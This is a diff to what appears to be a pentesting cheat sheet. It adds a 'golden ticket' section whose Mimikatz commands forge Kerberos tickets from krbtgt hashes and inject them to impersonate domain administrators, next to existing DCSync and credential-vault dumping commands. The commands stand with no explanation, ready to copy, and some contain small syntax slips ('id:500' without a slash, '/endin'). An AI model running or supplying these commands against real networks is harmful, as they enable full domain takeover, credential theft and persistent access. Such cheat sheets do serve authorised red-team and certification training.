@@ -2768,3 +2768,8 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /domain:dollarcorp.moneycorp.local /a
 ```
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "vault::cred /patch"'
 ```
+##### MIMIKATZ - GOLDEN TICKET
+```
+kerberos::golden /User:vegeta /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /krbtgt:28ec87e3414d019c944786bf447fd666 id:500 /groups:512 /startoffset:0 /ending:600 /renewmax:10080 /ptt
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+``` 
